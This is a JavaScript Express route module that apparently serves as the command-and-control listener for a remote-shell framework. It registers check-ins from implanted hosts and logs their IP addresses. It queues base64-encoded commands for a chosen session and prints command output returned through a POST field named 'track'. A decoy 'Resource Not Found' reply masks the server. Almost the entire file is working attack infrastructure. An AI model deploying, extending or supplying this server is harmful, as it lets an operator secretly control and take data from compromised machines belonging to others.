var express = require('express'),
    argv = require('yargs').argv,
    prompt = require('prompt'),
    router = express.Router(),
    shell = require('../modules/shell'),
    rawPayload = "Resource Not Found", recentlySet = false, activeShells = [],
    currentSessionId, firstArgument = argv._[0], payload = false;

setInterval(function(){
    payload = shell.input();
}, 100);

function getSessionPosition(id){
  return activeShells.map(function(e) { return e.id; }).indexOf(id);
}

exports.setPayload = function(payload){
  rawPayload = new Buffer(payload).toString('base64');
  rawPayload = rawPayload + "|"+currentSessionId;
  console.log("Session "+currentSessionId+" tasked to run '"+payload+"'");
};

exports.setCurrentSession = function(id){
  var doesIdExist = activeShells.map(function(e) { return e.id; }).indexOf(id);
  if (doesIdExist === -1){
    console.log("Invalid session id, try again!");
  } else {
    currentSessionId = id;
    exports.getCurrentSession();
  }

};

exports.getCurrentSession = function(bool){

  if(bool){
    try {
      console.log("Current session is "+currentSessionId+" which last checked in at "+activeShells[getSessionPosition(currentSessionId)].time);
    } catch(err){

    }
  }
  return currentSessionId;

};

exports.listSessions = function(){
  for (i=0;i<activeShells.length;i++){
    console.log("Session "+activeShells[i].id+" | ("+activeShells[i].ip+") Last checked in at "+activeShells[i].time);
  }
};

function Session(id, ip){
  var d = new Date();
  this.id = id;
  this.ip = ip;
  this.time = d.toUTCString();
  console.log("Session "+id+" established from "+ip);
}

function updateSession(pos, id){
  var d = new Date();
  d = d.toUTCString();
  activeShells[pos].time = d;
}

/* GET shells listing. */
router.get('/', function(req, res, next) {
  if(req.query.s){
    var arrayPos = activeShells.map(function(e) { return e.id; }).indexOf(req.query.s);
    if (arrayPos === -1){
      var sessionIp = req.ip.split(":")
      sessionIp = sessionIp[3];
      var sessionObj = new Session(req.query.s, sessionIp);
      activeShells.push(sessionObj);
      if (!currentSessionId){
        exports.setCurrentSession(req.query.s);
      }
    } else {
      updateSession(arrayPos, req.query.s);
    }
    if (recentlySet){
      //res.send(rawPayload);
      rawPayload = "Resource Not Found";
      recentlySet = false;
    }
  } else {

  }
  res.send(rawPayload);
});

router.post('/', function(req, res, next) {
  try {
    var rawResponse = decodeURIComponent(req.body.track);
    console.log(rawResponse);
    var results = new Buffer(rawResponse.split("|")[0], 'base64').toString("ascii");
    console.log(req.body);
    console.log("\n[*] Command Output Received\n\n");
    console.log(results);
    recentlySet = true;
  } catch(err){

  }

  res.send("True");

});


module.exports = router;
